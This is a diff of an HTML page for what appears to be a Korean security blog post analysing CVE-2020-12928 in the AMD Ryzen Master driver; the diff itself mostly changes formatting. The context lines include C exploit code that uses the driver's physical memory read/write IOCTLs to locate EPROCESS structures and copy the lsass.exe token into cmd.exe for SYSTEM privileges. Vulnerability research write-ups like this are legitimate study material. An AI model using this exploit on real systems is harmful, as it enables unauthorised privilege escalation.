@@ -246,8 +246,7 @@
 <p>&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 4 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(3) &#x2190; Now!</p>
 <hr>
 <p>&#xC5B4;&#xB290;&#xB367; &#xC2DC;&#xB9AC;&#xC988; &#xB9C8;&#xC9C0;&#xB9C9; &#xD30C;&#xD2B8;&#xB124;&#xC694;! &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xB294; Part 3&#xC5D0;&#xC11C; &#xC18C;&#xAC1C;&#xD588;&#xB358; exploit &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB300;&#xB85C; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9; &#xACFC;&#xC815;&#xC744; PoC &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74;&#xC11C; &#xC815;&#xB9AC;&#xD55C; &#xAE00;&#xC785;&#xB2C8;&#xB2E4;. &#xC5BC;&#xB978; cmd&#xCC3D;&#xC5D0;&#xC11C; <code>NT AUTHORITY\SYSTEM</code>&#xC744; &#xB744;&#xC6CC;&#xBCF4;&#xC790;&#xAD6C;&#xC694;!</p>
-<br>
-
+<p><br></p>
 <h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h2 id="Parse-EPROCESS"><a href="#Parse-EPROCESS" class="headerlink" title="Parse EPROCESS"></a>Parse EPROCESS</h2><p>&#xBA3C;&#xC800; arbitrary read &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB85C; &#xBB3C;&#xB9AC; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB9E4;&#xD551;&#xB418;&#xB294; kernel pool&#xC5D0;&#xC11C; <code>EPROCESS</code> &#xAD6C;&#xC870;&#xCCB4;&#xC640; &#xD1A0;&#xD070;&#xC744; &#xCC3E;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p>
 <ul>
 <li><code>EPROCESS</code> &#xB294; <code>POOL_HEADER</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C; &#xC77C;&#xC815;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</li>
@@ -259,27 +258,22 @@ PROCESS ffffbd010035b080
     SessionId: <span class="hljs-number">1</span>  Cid: <span class="hljs-number">0424</span>    Peb: af3c91000  ParentCid: <span class="hljs-number">0</span>c78
     DirBase: <span class="hljs-number">18e84</span>a000  ObjectTable: ffff9e8945b562c0  HandleCount:  <span class="hljs-number">68.</span>
     Image: cmd.exe</code></pre>
-
-<p><img src="/2021/08/11/l0ch/windows-driver-part4/1.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/08/11/l0ch/windows-driver-part4/1.png" srcset="/img/loading.gif" alt></p>
 <p><code>cmd.exe</code>&#xC758; EPROCESS &#xAD6C;&#xC870;&#xCCB4; &#xC8FC;&#xC18C; <code>0xffffbd010035b080 - 0x80 + 0x4</code> &#xC704;&#xCE58;&#xC5D0; Proc &#xD0DC;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p>
-<br>
-
+<p><br></p>
 <p>&#xC774;&#xB7EC;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC774; &#xC77C;&#xC815;&#xD55C;&#xC9C0; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC778; <code>lsass.exe</code>&#xB3C4; &#xD55C;&#xBC88; &#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c">PROCESS ffffbd0ffd7480c0
     SessionId: <span class="hljs-number">0</span>  Cid: <span class="hljs-number">0294</span>    Peb: <span class="hljs-number">81e2405000</span>  ParentCid: <span class="hljs-number">01f</span>4
     DirBase: <span class="hljs-number">233b</span>99000  ObjectTable: ffff9e893b5ff480  HandleCount: <span class="hljs-number">1365.</span>
     Image: lsass.exe</code></pre>
-
-<p><img src="/2021/08/11/l0ch/windows-driver-part4/2.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/08/11/l0ch/windows-driver-part4/2.png" srcset="/img/loading.gif" alt></p>
 <p><code>lsass.exe</code>&#xC758; EPROCESS &#xAD6C;&#xC870;&#xCCB4; &#xC8FC;&#xC18C; <code>0xffffbd0ffd7480c0 - 0x70 + 0x4</code> &#xC704;&#xCE58;&#xC5D0; Proc &#xD0DC;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB124;&#xC694;.</p>
-<br>
-
+<p><br></p>
 <p>&#xC74C;.. &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBCC4;&#xB85C; <code>POOL_HEADER</code>&#xC640; <code>EPROCESS</code> &#xC0AC;&#xC774; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xCC28;&#xC774;&#xAC00; &#xC788;&#xB124;&#xC694;. &#xADF8;&#xB7EC;&#xB098; &#xB450; &#xC0AC;&#xC9C4; &#xBAA8;&#xB450; &#xD30C;&#xB780;&#xC0C9; &#xBC15;&#xC2A4;&#xB97C; &#xBCF4;&#xBA74; <code>EPROCESS</code> &#xC8FC;&#xC18C;&#xC758; &#xD558;&#xC704; 4 bytes &#xAC12;&#xC740; &#xD56D;&#xC0C1; <code>0x00000003</code>&#xC73C;&#xB85C; &#xACE0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; Proc &#xD0DC;&#xADF8;&#xB97C; &#xCC3E;&#xACE0;, &#xD0DC;&#xADF8;&#xB85C;&#xBD80;&#xD130; &#xC57D; <code>0x100</code> &#xC624;&#xD504;&#xC14B; &#xC0AC;&#xC774;&#xC758; <code>0x00000003</code> &#xAC12;&#xC774; &#xC788;&#xB2E4;&#xBA74; <code>EPROCESS</code> &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xC704;&#xCE58;&#xB97C; &#xD2B9;&#xC815;&#xD560; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;! IOCTL <code>0x81112F08</code> &#xB85C; &#xBAA8;&#xB4E0; kernel pool&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC73C;&#xB2C8; &#xC6B0;&#xB9AC;&#xAC00; &#xAD8C;&#xD55C;&#xC744; &#xC0C1;&#xC2B9;&#xC2DC;&#xD0A4;&#xAE38; &#xC6D0;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>EPROCESS</code> &#xB610;&#xD55C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <blockquote>
 <p>&#xC624;&#xD504;&#xC14B;&#xACFC; <code>EPROCESS</code> &#xD558;&#xC704; 4 bytes &#xAC12; <code>0x00000003</code>&#xC740; &#xC708;&#xB3C4;&#xC6B0; &#xBE4C;&#xB4DC; &#xBC84;&#xC804;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB97C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 </blockquote>
-<br>
-
+<p><br></p>
 <p>&#xC6B0;&#xC120; &#xC804;&#xCCB4; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC11C;&#xCE6D;&#xD558;&#xBA70; <code>Proc</code> &#xD0DC;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xBAA8;&#xB450; &#xAE30;&#xB85D;&#xD558;&#xAE30; &#xC704;&#xD574; <code>PROC_DATA</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC120;&#xC5B8;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
     INT64 proc_address[<span class="hljs-number">300</span>];
@@ -287,9 +281,7 @@ PROCESS ffffbd010035b080
     INT64 header_size[<span class="hljs-number">300</span>];
     INT64 proc_count;
 } PROC_DATA;</code></pre>
-
-<br>
-
+<p><br></p>
 <p>&#xC774;&#xC81C; &#xC11C;&#xCE6D;&#xD560; &#xBB3C;&#xB9AC; &#xBA54;&#xBAA8;&#xB9AC; &#xBC94;&#xC704;&#xB97C; &#xC9C0;&#xC815;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;, &#xC774; &#xBC94;&#xC704;&#xB294; &#xD638;&#xC2A4;&#xD2B8;&#xC758; &#xC804;&#xCCB4; &#xBA54;&#xBAA8;&#xB9AC;&#xB098; (&#xAC00;&#xC0C1;&#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xB294; &#xACBD;&#xC6B0;) &#xAC00;&#xC0C1;&#xBA38;&#xC2E0;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xD06C;&#xAE30; &#xB4F1;&#xC5D0; &#xB530;&#xB77C; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC544; &#xC11C;&#xCE6D;&#xD560; &#xBA54;&#xBAA8;&#xB9AC; &#xBC94;&#xC704;&#xAC00; &#xD06C;&#xAC8C; &#xCC28;&#xC774;&#xAC00; &#xB098;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xB294; &#xD658;&#xACBD;&#xC5D0; &#xB9DE;&#xAC8C; &#xC124;&#xC815;&#xD574;&#xC8FC;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC81C; &#xACBD;&#xC6B0;&#xB294; &#xD638;&#xC2A4;&#xD2B8; PC 16GB, VM&#xC5D0; 4GB&#xB97C; &#xD560;&#xB2F9;&#xD588;&#xC73C;&#xBA70; <code>0x120000000</code> ~ <code>0x240000000</code> &#xBC94;&#xC704;&#xB85C; &#xC9C0;&#xC815;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEVICE_NAME         <span class="hljs-meta-string">&quot;\\\\\\\\.\\\\AMDRyzenMasterDriverV15&quot;</span></span>
 <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WRITE_IOCTL         (DWORD)0x81112F0C</span>
@@ -346,28 +338,22 @@ PROCESS ffffbd010035b080
 }
 
 ...</code></pre>
-
 <p>&#xC704; &#xCF54;&#xB4DC;&#xB294; <code>0x120000000</code> ~ <code>0x240000000</code> &#xC0AC;&#xC774; Proc &#xD0DC;&#xADF8;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xBAA8;&#xB450; &#xCC3E;&#xB294; &#xB8E8;&#xD2F4;&#xC785;&#xB2C8;&#xB2E4;.</p>
-<br>
-
+<p><br></p>
 <pre><code class="hljs c">INT64 read_address = START_ADDRESS + (i * <span class="hljs-number">0x1000</span>);
 <span class="hljs-keyword">if</span> (read_address &gt;= END_OF_ADDRESS) {
 	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;END of Address\\n&quot;</span>);
 	<span class="hljs-keyword">return</span> proc_data;
 }</code></pre>
-
 <p>&#xC77D;&#xC744; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; <code>0x120000000</code>&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD574; Page &#xD06C;&#xAE30;&#xC778; <code>0x1000</code> &#xB2E8;&#xC704;&#xB85C; &#xC99D;&#xAC00;&#xC2DC;&#xD0A4;&#xBA70; &#xC11C;&#xCE6D;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p>
-<br>
-
+<p><br></p>
 <pre><code class="hljs c">READ_INPUT_BUFFER input_buff = { read_address, len };
 LPVOID output_buff = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100c</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
 DeviceIoControl(dHandle, READ_IOCTL, &amp;input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>);
 INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;</code></pre>
-
 <p><code>input_buff</code>&#xC5D0;&#xB294; &#xBB3C;&#xB9AC; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC640; &#xAE38;&#xC774;(<code>0x1000</code>)&#xB97C; &#xC8FC;&#xACE0;, <code>output_buff</code>&#xC5D0; &#xCDA9;&#xBD84;&#xD55C; &#xACF5;&#xAC04;&#xC744; &#xD560;&#xB2F9;&#xD574; <code>DeviceIoControl</code> &#xD568;&#xC218;&#xB85C; <code>0x81112F08</code> IOCTL &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.  <code>0x81112F08</code> &#xC740; METHOD_BUFFERED &#xB85C; input&#xACFC; output &#xBC84;&#xD37C;&#xB97C; &#xACF5;&#xC720;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; IOCTL &#xACB0;&#xACFC; &#xBC84;&#xD37C;&#xC5D0; Input&#xAC12;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>output_buff</code>&#xC5D0; <code>0xc</code> (<code>INT64 read_address(0x8) + DWORD len(0x4)</code>) &#xB9CC;&#xD07C; &#xB354;&#xD55C; &#xC704;&#xCE58;&#xC758; &#xAC12;&#xC774; IOCTL &#xC694;&#xCCAD;&#xC758; &#xACB0;&#xACFC;&#xAC12;&#xC778; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xAC00; &#xB418;&#xACE0; <code>result</code>&#xB85C; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</p>
-<br>
-
+<p><br></p>
 <pre><code class="hljs c"><span class="hljs-keyword">for</span> (INT64 j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0xF60</span>; j += <span class="hljs-number">0x10</span>) { <span class="hljs-comment">// Searching Proc Tag</span>
 	PINT64 proc_ptr = (PINT64)(result + <span class="hljs-number">0x4</span> + j);
 	INT32 proc_val = *(PINT32)proc_ptr
@@ -390,10 +376,8 @@ INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;</code>
 		}            
 	}
 }</code></pre>
-
 <p>&#xC6B0;&#xC120; <code>result</code>&#xC5D0;&#xC11C; <code>0x10</code> aligned &#xB2E8;&#xC704;&#xB85C; &#xB8E8;&#xD504;&#xB97C; &#xB3CC;&#xBA70; <code>+0x4</code> &#xC704;&#xCE58; &#xC8FC;&#xC18C;&#xC758; &#xAC12;&#xC774; <code>0x635f7250</code>(Proc)&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. Proc &#xD0DC;&#xADF8;&#xB97C; &#xCC3E;&#xC558;&#xC73C;&#xBA74; &#xC774;&#xD6C4; <code>PROC_HEADER</code>&#xC758; &#xC608;&#xC0C1; &#xCD5C;&#xB300; &#xD06C;&#xAE30;&#xC778; &#xC57D; <code>0xA0</code>&#xAE4C;&#xC9C0; <code>0x10</code> &#xB2E8;&#xC704;&#xB85C; &#xB8E8;&#xD504;&#xB97C; &#xD55C; &#xBC88; &#xB354; &#xB3CC;&#xBA74;&#xC11C; <code>0x00000003</code> &#xAC12;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xCC3E;&#xACE0;, &#xCC3E;&#xC73C;&#xBA74; &#xD604;&#xC7AC;&#xAE4C;&#xC9C0; &#xAD6C;&#xD55C; Proc tag address &#xC640; page entry offset, header size&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xAC12;&#xC73C;&#xB85C; &#xC774;&#xD6C4;&#xC5D0; &#xB2E4;&#xC2DC; <code>EPRCEOSS</code>&#xC758; &#xC704;&#xCE58;&#xB97C; &#xACC4;&#xC0B0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
-<br>
-
+<p><br></p>
 <p>&#xC774;&#xC81C; &#xC800;&#xC7A5;&#xB41C; <code>PROC_DATA</code> &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xAC01; &#xBC30;&#xC5F4;&#xC5D0;&#xC11C; <code>EPROCESS</code> &#xC758; &#xAC01; &#xD544;&#xB4DC;&#xAC12;(<code>ImageFileName</code>, <code>Token</code>, <code>UniqueProcessId</code>)&#xC744; &#xAD6C;&#xD558;&#xACE0; <code>cmd.exe</code>&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>Token</code> &#xC8FC;&#xC18C;&#xC640; &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>Token</code> &#xAC12;&#xC744; &#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">parse_proc</span><span class="hljs-params">(PROC_DATA proc_data, HANDLE dHandle)</span> </span>{
     DWORD bytes_ret = <span class="hljs-number">0</span>;
@@ -426,10 +410,8 @@ INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;</code>
         }
     }
 }</code></pre>
-
 <p><code>proc_address &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C; + page entry offset + header size</code> &#xAC00; <code>EPROCESS</code>&#xC758; &#xC704;&#xCE58;&#xAC00; &#xB418;&#xBA70; &#xC0AC;&#xC804;&#xC5D0; &#xAD6C;&#xD55C; <code>EPROCESS</code>&#xC758; &#xAC01; &#xD544;&#xB4DC;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744; &#xB354;&#xD574; <code>Token</code>&#xACFC; <code>ImageFileName</code>&#xC744; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>ImageFileName</code>&#xC774; <code>cmd.exe</code>&#xBA74; &#xD574;&#xB2F9; <code>EPROCESS</code>&#xC758; <code>Token</code> &#xD544;&#xB4DC; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0;, &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4; <code>lsass.exe</code>&#xBA74; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>Token</code> &#xD544;&#xB4DC;&#xC758; &#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
-<br>
-
+<p><br></p>
 <h2 id="Overwrite-Token"><a href="#Overwrite-Token" class="headerlink" title="Overwrite Token"></a>Overwrite Token</h2><p>&#xC774;&#xC81C; &#xC774;&#xC804; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xD55C; &#xAC83; &#xCC98;&#xB7FC; <code>lsass.exe</code>&#xC758; <code>Token</code>&#xAC12;&#xC744; <code>cmd.exe</code>&#xC758; <code>Token</code> &#xD544;&#xB4DC;&#xC5D0; overwrite&#xD558;&#xBA74; <code>cmd.exe</code>&#xC758; &#xAD8C;&#xD55C;&#xC744; <code>NT AUTORITY\SYSTEM</code>&#xC73C;&#xB85C; &#xBC14;&#xAFD4; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">overwrite_token</span><span class="hljs-params">(HANDLE dHandle)</span> </span>{
     DWORD modulus = cmd_token_addr % <span class="hljs-number">0x1000</span>;
@@ -459,16 +441,13 @@ INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;</code>
     DeviceIoControl(dHandle, WRITE_IOCTL, input_buff2, modulus + <span class="hljs-number">0x8</span> + <span class="hljs-number">0xc</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;bytes_ret, <span class="hljs-literal">NULL</span>);
 
 }</code></pre>
-
 <p>&#xC774;&#xB54C; &#xD55C; &#xAC00;&#xC9C0; &#xBB38;&#xC81C;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xB370;, Page &#xB2E8;&#xC704;&#xB85C; &#xB9E4;&#xD551;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; memory write&#xC758; &#xACBD;&#xC6B0; &#xC815;&#xD655;&#xD788; Token &#xAC12; 8 bytes&#xB9CC; overwrite&#xD560; &#xC218; &#xC5C6;&#xB2E4;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p>&#xD574;&#xACB0;&#xBC95;&#xC740; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;! Page pool&#xC758; &#xC2DC;&#xC791;&#xBD80;&#xD130; <code>Token</code> &#xC8FC;&#xC18C; &#xC804;&#xAE4C;&#xC9C0;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xAC12;&#xB4E4;&#xC744; <code>READ_IOCTL</code>&#xB85C; &#xBAA8;&#xB450; &#xAC00;&#xC838;&#xC640; &#xBC84;&#xD37C;&#xC5D0; &#xC800;&#xC7A5;&#xD55C; &#xB4A4;, &#xD574;&#xB2F9; &#xBC84;&#xD37C;&#xC5D0; overwrite&#xD560; &#xD1A0;&#xD070;&#xAC12;&#xB9CC; &#xCD94;&#xAC00;&#xD55C; &#xBC84;&#xD37C;&#xB97C; <code>WRITE_IOCTL 0x81112F0C</code>&#xC744; &#xD1B5;&#xD574; input&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xBA74; Page pool &#xC2DC;&#xC791;&#xC8FC;&#xC18C;&#xBD80;&#xD130; <code>Token</code> &#xC8FC;&#xC18C; &#xC804;&#xAE4C;&#xC9C0;&#xB294; exploit &#xC804;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xAC12;&#xC774; &#xC720;&#xC9C0;&#xB418;&#xACE0; &#xD1A0;&#xD070;&#xAC12;&#xB9CC; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
-<br>
-
+<p><br></p>
 <p>&#xC774;&#xC81C; cmd&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xBE4C;&#xB4DC;&#xD55C; PoC&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;..</p>
-<p><img src="/2021/08/11/l0ch/windows-driver-part4/3.gif" srcset="/img/loading.gif"></p>
+<p><img src="/2021/08/11/l0ch/windows-driver-part4/3.gif" srcset="/img/loading.gif" alt></p>
 <p>&#xC775;&#xC2A4; &#xC131;&#xACF5;!</p>
-<br>
-
+<p><br></p>
 <p>&#xC544;&#xB798;&#xB294; &#xC804;&#xCCB4; PoC&#xC785;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span>
 <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
@@ -625,7 +604,6 @@ INT64 system_token_value = <span class="hljs-number">0</span>;
     CloseHandle(dHandle);
     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
 }</code></pre>
-
 <p>&#xAE30;&#xCD08;&#xAC00; &#xBD80;&#xC2E4;&#xD574;&#xC11C; &#xBB3C;&#xB9AC;&#xBA54;&#xBAA8;&#xB9AC; &#x2194; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC774; &#xB9E4;&#xD551; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC81C;&#xB300;&#xB85C; &#xB2E4;&#xC2DC; &#xC774;&#xD574;&#xD558;&#xB290;&#xB77C; &#xACE0;&#xC0DD;&#xC744; &#xC880; &#xD55C; &#xAC70; &#xB9D0;&#xACE0;&#xB294;&#x2026; &#xBB34;&#xB09C;&#xD558;&#xAC8C; &#xBD84;&#xC11D;&#xD588;&#xB358; &#xAC83; &#xAC19;&#xB124;&#xC694;. &#xC5ED;&#xC2DC; &#xACF5;&#xBD80; &#xD55C;&#xBC88; &#xD560; &#xB54C; &#xC81C;&#xB300;&#xB85C; &#xD574;&#xB194;&#xC57C; &#xB098;&#xC911;&#xC5D0; &#xACE0;&#xC0DD;&#xC744; &#xC548;&#xD558;&#xC9C0;&#x3160;&#x3160;</p>
 <p>&#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xC815;&#xC0C1;&#xC801;&#xC778;(?) &#xC81C;&#xBAA9;&#xC758; &#xC2DC;&#xB9AC;&#xC988;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC548;&#xB155;~</p>
 <blockquote>
@@ -654,11 +632,11 @@ INT64 system_token_value = <span class="hljs-number">0</span>;
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/lpe/">lpe</a>
+                  <a class="hover-with-bg" href="/tags/windows/">windows</a>
                   
                   <a class="hover-with-bg" href="/tags/kernel/">kernel</a>
                   
-                  <a class="hover-with-bg" href="/tags/windows/">windows</a>
+                  <a class="hover-with-bg" href="/tags/lpe/">lpe</a>
                   
                   <a class="hover-with-bg" href="/tags/L0ch/">L0ch</a>
                   
